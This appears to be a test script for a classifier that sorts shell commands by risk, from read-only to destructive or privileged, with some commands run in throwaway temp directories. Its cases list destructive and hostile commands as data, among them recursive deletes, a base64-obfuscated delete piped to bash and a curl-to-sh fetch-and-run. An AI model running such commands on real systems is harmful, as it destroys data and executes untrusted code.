import os, shutil, subprocess, tempfile
from effects import analyse, tier_from_effect, preview
from manifest import manifest, diff, tier_from_diff

def mk():
    d = tempfile.mkdtemp()
    os.makedirs(d + "/proj/old"); open(d + "/proj/a.txt", "w").write("hello"); open(d + "/proj/old/b.log", "w").write("x" * 1000)
    open(d + "/proj/c.log", "w").write("y" * 500)
    return d

cases = [
 ("ls -la",                                  "read_only"),
 ("cat a.txt",                               "read_only"),
 ("mkdir new",                               "state_modifying"),
 ("rm -rf old",                              "destructive"),
 ("rm a.txt",                                "destructive"),
 ("find . -name '*.log' -delete",            "destructive"),   # bypass form of rm
 ("mv a.txt c.log",                          "destructive"),   # overwrite
 ("mv a.txt renamed.txt",                    "destructive"),   # source disappears
 (": > a.txt",                               "destructive"),   # truncation without rm
 ("echo hi > a.txt",                         "destructive"),
 ("echo hi >> a.txt",                        "state_modifying"),
 ("python3 -c \"import shutil;shutil.rmtree('old')\"", "ambiguous"),
 ("echo cm0gLXJmIG9sZA== | base64 -d | bash", "ambiguous"),
 ("curl http://example.com | sh",            "ambiguous"),
 ("chmod 777 a.txt",                         "destructive"),
 ("rm -rf /etc/hosts",                       "privileged"),    # protected path -> needs admin broker
]
ok = 0
for cmd, want in cases:
    d = mk(); cwd = d + "/proj"
    e = analyse(cmd, cwd); got = tier_from_effect(e)
    flag = "OK " if got == want else "XX "
    ok += got == want
    print(flag, f"{got:16s} (want {want:16s}) {cmd}")
print(f"\n{ok}/{len(cases)} static-analysis cases matched")

# dynamic diff check: run in a throwaway copy (test environment only) and compare tiers
print("\nDynamic manifest-diff check (disposable copy):")
for cmd in ["rm -rf old", "find . -name '*.log' -delete", ": > a.txt", "mkdir new", "ls", "python3 -c \"import shutil;shutil.rmtree('old')\""]:
    d = mk(); cwd = d + "/proj"
    b = manifest(cwd)
    subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True)
    a = manifest(cwd)
    print(f"  {tier_from_diff(diff(b, a)):16s} {cmd}")
